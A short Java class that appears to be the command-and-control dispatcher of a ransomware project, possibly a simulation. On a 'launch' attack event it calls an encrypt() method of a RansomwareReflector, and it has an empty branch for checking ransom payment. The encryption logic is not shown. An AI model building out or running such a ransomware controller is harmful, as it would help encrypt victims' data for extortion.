package leverCom;

import com.google.common.eventbus.Subscribe;
import console.Subscriber;
import events.AttackEvent;

public class CommandControl extends Subscriber {
    private final RansomwareReflector reflector;
    public CommandControl(Integer id){
        super(id);
        this.reflector = new RansomwareReflector();
    }

    @Subscribe
    public void receive(AttackEvent event){
        switch (event.getTask()){
            case CL_LAUNCH -> {
                this.reflector.encrypt();
            }
            case CL_CHECKPAYMENT -> {

            }
        }
    }
}
